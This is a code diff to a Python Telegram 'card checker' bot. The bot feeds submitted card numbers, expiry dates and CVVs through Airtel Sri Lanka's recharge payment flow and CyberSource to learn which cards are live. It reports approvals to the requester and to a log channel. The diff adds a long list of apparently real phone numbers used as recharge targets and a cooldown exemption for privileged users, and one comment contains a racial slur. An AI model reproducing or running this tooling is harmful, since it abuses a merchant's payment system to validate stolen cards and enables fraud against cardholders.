@@ -1,4 +1,3 @@
-
 import requests
 import json
 import re
@@ -8,7 +7,7 @@ import random
 from bs4 import BeautifulSoup
 from bin_look import bin_lokup
 from .encrypt import encrypt_data, gen_public_key
-
+from database.sudousers import get_sudolisted
 
 
 def checking_function(credit_number, bot, message, update_cooldown, user_id):
@@ -24,11 +23,11 @@ def checking_function(credit_number, bot, message, update_cooldown, user_id):
     if len(ano) == 2:
       ano = '20' + ano
     cvv = extracted_parts[3]
-    
-    bot.edit_message_text(
-      chat_id=message.chat.id,
-      message_id=message.message_id,text="<b>CHECKING ◈◈◇◇</b>",parse_mode='HTML'
-    )
+
+    bot.edit_message_text(chat_id=message.chat.id,
+                          message_id=message.message_id,
+                          text="<b>CHECKING ◈◈◇◇</b>",
+                          parse_mode='HTML')
     # Define the URL
     url_paymentInit = 'https://recharge.airtel.lk/recharge/scapp/payment/paymentInit'
     session = requests.Session()
@@ -58,7 +57,60 @@ def checking_function(credit_number, bot, message, update_cooldown, user_id):
     }
     # List of numbers
     numbers = [
-        758400450, 754578455, 757854196, 755421366, 757514524, 751245387
+        754423105, 751818629, 758292222, 752253511, 755345326, 753316364,
+        755148640, 752394490, 755631500, 759766886, 756972896, 753260192,
+        754227037, 753296258, 759282536, 759958524, 757394958, 756071158,
+        752385956, 757205024, 754091914, 758251470, 759280845, 753977715,
+        753295946, 756154891, 757733508, 759263117, 754759090, 752309309,
+        756815370, 754951530, 755808461, 752297088, 758076844, 757518190,
+        759202531, 753161043, 755270069, 751142264, 752668444, 752901879,
+        752482708, 756261143, 757272967, 751302833, 751833870, 753445360,
+        755908868, 756516583, 756911088, 759635242, 757413383, 758643088,
+        751258410, 759314030, 757189767, 754924881, 756694758, 753233888,
+        756285171, 755091808, 752400623, 757551602, 757517775, 754685932,
+        756156384, 756371356, 752662417, 755978358, 754505911, 752701362,
+        751419692, 757246292, 759915891, 751842824, 754912883, 759019693,
+        759490342, 751157482, 753948598, 759935212, 755505840, 758838315,
+        757374771, 754034843, 751337356, 757708666, 753227115, 751489132,
+        759906684, 757334338, 757560018, 758118102, 756383097, 756705793,
+        757920894, 753453616, 759228475, 754046008, 751807450, 755824430,
+        754359363, 751181942, 759457116, 753911479, 756760370, 754822966,
+        754525338, 753669850, 754626493, 753660682, 751544550, 757183519,
+        754272412, 753734558, 751363926, 751244005, 757919062, 758250730,
+        758076389, 755090591, 757332712, 757345086, 759687440, 751166830,
+        756528421, 759128069, 755207291, 754193601, 753278325, 751408039,
+        757299128, 753344719, 751685454, 758114655, 752840021, 754786510,
+        755067082, 759931248, 754260134, 755618848, 751123997, 759704953,
+        757097639, 752765556, 757215247, 753862229, 755051082, 754943777,
+        758248773, 756961127, 755098465, 757133526, 755013173, 759619813,
+        756398401, 751104148, 759243199, 754240713, 757689052, 752830280,
+        757817185, 759589238, 754458390, 755420539, 758596538, 751148693,
+        752894331, 758869918, 756878773, 756861139, 756318435, 756282440,
+        759997165, 757185711, 759740213, 757363371, 759826441, 752304493,
+        759847168, 759073811, 757059318, 752091041, 759298642, 757942374,
+        757985633, 756937960, 758763457, 752629655, 758973164, 751816142,
+        753397293, 757870448, 759175224, 752021948, 759617987, 758848684,
+        751436932, 757143361, 753045698, 758783918, 758190391, 758480133,
+        754753680, 754496886, 756312490, 759789610, 752000900, 755948393,
+        758151895, 754006353, 756393131, 755373571, 753440566, 753390844,
+        756415399, 753946538, 752186482, 758933643, 757080143, 752377102,
+        754314545, 752434586, 756013102, 758775157, 757766465, 758148097,
+        758311241, 757872754, 759888835, 756798832, 757348858, 759157494,
+        754081015, 755381905, 758358625, 758100305, 758443935, 755914118,
+        759366695, 758054431, 752589451, 752521528, 756460433, 751155276,
+        753530989, 756410174, 751164899, 755681413, 753258426, 752610485,
+        752883663, 759089792, 757613184, 751005375, 754599752, 753758185,
+        756528059, 759089285, 755021281, 753560283, 757073686, 753843523,
+        759224631, 751556900, 755672245, 757875230, 753600977, 753402240,
+        754694425, 759239075, 758908932, 758088706, 758546063, 755149072,
+        758403422, 756250241, 752409881, 752073768, 758705019, 758379898,
+        758336009, 758122045, 757956104, 759795710, 752684180, 756360976,
+        759934126, 759049489, 751068931, 754815912, 753488202, 759186355,
+        753950186, 759965516, 755061958, 757701033, 758132144, 752235452,
+        755982214, 758740763, 758803135, 751624829, 758839751, 752373498,
+        757967576, 757942143, 755192934, 757902683, 755028710, 751118316,
+        755320323, 754880872, 754446237, 754111169, 755923478, 759926159,
+        756323563, 759972775, 755494874, 751677634
     ]
     ##bot.edit_message_text(chat_id=sent_message.chat.id,message_id=sent_message.message_id,text="Please wait nigg! Checking your card...")
 
@@ -75,7 +127,6 @@ def checking_function(credit_number, bot, message, update_cooldown, user_id):
         'ipg_type': '',
         'cux_type': '1'
     }
-    
 
     # Send the POST request
     response_paymentInit = session.post(url_paymentInit,
@@ -154,11 +205,10 @@ def checking_function(credit_number, bot, message, update_cooldown, user_id):
         'bill_to_surname': 'Airtel',
         'signature': signature
     }
-    bot.edit_message_text(
-      chat_id=message.chat.id,
-      message_id=message.message_id,text="<b>CHECKING ◈◈◈◇</b>",
-      parse_mode='HTML'
-    )
+    bot.edit_message_text(chat_id=message.chat.id,
+                          message_id=message.message_id,
+                          text="<b>CHECKING ◈◈◈◇</b>",
+                          parse_mode='HTML')
 
     response_for_2req = session.post(url_pay,
                                      headers=headers_pay,
@@ -168,7 +218,8 @@ def checking_function(credit_number, bot, message, update_cooldown, user_id):
     initial_cookies_dict = {}
     bot.edit_message_text(chat_id=message.chat.id,
                           message_id=message.message_id,
-                          text="<b>CHECKING ◈◈◈◈</b>", parse_mode='HTML')
+                          text="<b>CHECKING ◈◈◈◈</b>",
+                          parse_mode='HTML')
     initial_cookies = response_for_2req.history[0].cookies
     for cookie in initial_cookies:
       initial_cookies_dict[cookie.name] = cookie.value
@@ -386,8 +437,8 @@ def checking_function(credit_number, bot, message, update_cooldown, user_id):
     response_auth = session.post(url_auth,
                                  headers=headers_auth,
                                  data=payload_auth)
-#print(response_auth.text)
-    
+    #print(response_auth.text)
+
     #print(response_r)
     # Convert the JSON string to a Python dictionary
     response_data = json.loads(response_auth.text)
@@ -396,14 +447,21 @@ def checking_function(credit_number, bot, message, update_cooldown, user_id):
       end = time.time()
       elapsed_time = end - start
       formated_time = "{:.2f}".format(elapsed_time)
-      formatted_result = f"<b>» CYBERSOURCE CHARGE</b>\n\n<b>» CARD :</b> <code>{credit_number}</code>\n<b>» STATUS :</b> DECLINE ❌\n<b>» RESPONSE : </b>Need to Authenticate \n<b>» CURRENCY :</b> LKR\n\n<b>» REQ BY :</b> <a href='tg://user?id={user_id}'>{user_id}</a>\n<b>» TIME :</b> {formated_time} s"
+      formatted_result = (
+          f"<b>[ϟ] DECLINE ❌</b>\n\n"
+          f"<b>[ϟ] CARD :</b><code> {credit_number}</code>\n"
+          f"<b>[ϟ] RESPONSE :</b> Need to Authenticate\n\n"
+          f"<b>[ϟ] REQ BY :</b> <a href='tg://user?id={user_id}'>{user_id}</a>\n"
+          f"<b>[ϟ] TIME :</b> {formated_time} s")
       bot.edit_message_text(chat_id=message.chat.id,
                             message_id=message.message_id,
                             text=formatted_result,
                             parse_mode="HTML")
-      update_cooldown(message.from_user.id, end)
-      return True
-
+      al = get_sudolisted()
+      if message.from_user.id not in al:
+        return update_cooldown(message.from_user.id, end)
+      else:
+        return
     # prayer authenication eke aulk eke client sesion id ek hoygnn one ethain eahatathmi hdnn thiyewnnw ok done byy viagen passe hambemu
     url_payer_authentication = 'https://secureacceptance.cybersource.com/payer_authentication/hybrid'
 
@@ -460,33 +518,32 @@ def checking_function(credit_number, bot, message, update_cooldown, user_id):
       elapsed_time = end - start
 
       user_link = f"[{message.from_user.first_name}](tg://user?id={user_id}')"
-      
+
       formated_time = "{:.2f}".format(elapsed_time)
+
       symbol = "❌" if message_decision_value in ("DECLINE", "ERROR") else "✅"
-      formatted_result = f"<b>» CYBERSOURCE CHARGE</b>\n\n<b>» CARD :</b> <code>{credit_number}</code>\n<b>» STATUS :</b> {message_decision_value} {symbol}\n<b>» RESPONSE : </b>{message_value} \n<b>» CURRENCY :</b> LKR\n\n<b>» REQ BY :</b> <a href='tg://user?id={user_id}'>{user_id}</a>\n<b>» TIME :</b> {formated_time} s"
+      formatted_result = (
+          f"<b>[ϟ] {message_decision_value} {symbol}</b>\n\n"
+          f"<b>[ϟ] CARD :</b><code> {credit_number}</code>\n"
+          f"<b>[ϟ] RESPONSE :</b> {message_value}\n\n"
+          f"<b>[ϟ] REQ BY :</b> <a href='tg://user?id={user_id}'>{user_id}</a>\n"
+          f"<b>[ϟ] TIME :</b> {formated_time} s")
+
       bot.edit_message_text(chat_id=message.chat.id,
                             message_id=message.message_id,
                             text=formatted_result,
                             parse_mode='HTML')
 
-      bot.send_message(
-          chat_id=log_channel_id,
-          text=
-          f"{formatted_result}\n\n",
-          parse_mode='HTML')
-
-      update_cooldown(message.from_user.id, end)
-      return True
+      bot.send_message(chat_id=log_channel_id,
+                       text=f"{formatted_result}\n\n",
+                       parse_mode='HTML')
+      al = get_sudolisted()
+      if message.from_user.id not in al:
+        return update_cooldown(message.from_user.id, end)
+      else:
+        return
     else:
       return "Input element 'message' not found in the HTML content."
 
   except Exception as e:
     return f'#ERR{e}'
-
-
-"""file_name = "cc.txt"  # Replace 'your_file.txt' with the actual file name
-
-with open(file_name, 'r') as file:
-  for line in file:
-    card_number = line.strip()  # Read each line (card number) from the file
-    result = print(checking_function(card_number))"""
